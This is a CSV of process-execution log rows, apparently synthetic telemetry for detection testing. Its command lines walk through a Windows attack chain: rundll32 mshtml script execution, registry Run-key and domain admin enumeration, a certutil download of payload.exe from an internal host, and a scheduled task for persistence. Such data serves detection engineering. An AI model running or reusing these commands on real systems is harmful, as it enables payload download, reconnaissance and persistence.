user,src_ip,dest_ip,parent_process,process,commandline
analyst,10.0.0.34,192.168.0.34,explorer.exe,rundll32.exe,"rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();"
analyst,10.0.0.35,192.168.0.35,explorer.exe,rundll32.exe,"rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();"
analyst,10.0.0.36,192.168.0.36,explorer.exe,rundll32.exe,"rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();"
analyst,10.0.0.37,192.168.0.37,explorer.exe,rundll32.exe,"rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();"
analyst,10.0.0.38,192.168.0.38,explorer.exe,rundll32.exe,"rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();"
analyst,10.0.0.39,192.168.0.39,explorer.exe,rundll32.exe,"rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();"
analyst,10.0.0.40,192.168.0.40,explorer.exe,rundll32.exe,"rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();"
analyst,10.0.0.41,192.168.0.41,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.42,192.168.0.42,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.43,192.168.0.43,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.44,192.168.0.44,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.45,192.168.0.45,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.46,192.168.0.46,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.47,192.168.0.47,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.48,192.168.0.48,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.49,192.168.0.49,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.50,192.168.0.50,explorer.exe,reg.exe,reg.exe query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
analyst,10.0.0.51,192.168.0.51,explorer.exe,net.exe,net user /domain
analyst,10.0.0.52,192.168.0.52,explorer.exe,net.exe,net user /domain
analyst,10.0.0.53,192.168.0.53,explorer.exe,net.exe,net user /domain
analyst,10.0.0.54,192.168.0.54,explorer.exe,net.exe,net user /domain
analyst,10.0.0.55,192.168.0.55,explorer.exe,net.exe,net user /domain
analyst,10.0.0.56,192.168.0.56,explorer.exe,net.exe,net user /domain
analyst,10.0.0.57,192.168.0.57,explorer.exe,net.exe,net user /domain
analyst,10.0.0.58,192.168.0.58,explorer.exe,net.exe,net user /domain
analyst,10.0.0.59,192.168.0.59,explorer.exe,net.exe,net user /domain
analyst,10.0.0.60,192.168.0.60,explorer.exe,net.exe,net user /domain
analyst,10.0.0.61,192.168.0.61,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.62,192.168.0.62,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.63,192.168.0.63,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.64,192.168.0.64,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.65,192.168.0.65,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.66,192.168.0.66,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.67,192.168.0.67,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.68,192.168.0.68,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.69,192.168.0.69,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.70,192.168.0.70,explorer.exe,net.exe,"net group ""Domain Admins"" /domain"
analyst,10.0.0.71,192.168.0.71,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.72,192.168.0.72,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.73,192.168.0.73,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.74,192.168.0.74,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.75,192.168.0.75,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.76,192.168.0.76,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.77,192.168.0.77,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.78,192.168.0.78,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.79,192.168.0.79,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.80,192.168.0.80,explorer.exe,whoami.exe,whoami.exe
analyst,10.0.0.81,192.168.0.81,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.82,192.168.0.82,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.83,192.168.0.83,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.84,192.168.0.84,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.85,192.168.0.85,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.86,192.168.0.86,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.87,192.168.0.87,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.88,192.168.0.88,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.89,192.168.0.89,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.90,192.168.0.90,explorer.exe,certutil.exe,certutil.exe -urlcache -split -f http://10.0.0.5/payload.exe C:\Windows\Temp\payload.exe
analyst,10.0.0.91,192.168.0.91,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.92,192.168.0.92,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.93,192.168.0.93,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.94,192.168.0.94,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.95,192.168.0.95,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.96,192.168.0.96,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.97,192.168.0.97,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.98,192.168.0.98,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.99,192.168.0.99,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
analyst,10.0.0.100,192.168.0.100,explorer.exe,schtasks.exe,"schtasks.exe /Create /SC MINUTE /MO 5 /TN ""Updater"" /TR ""C:\Windows\Temp\updater.exe"""
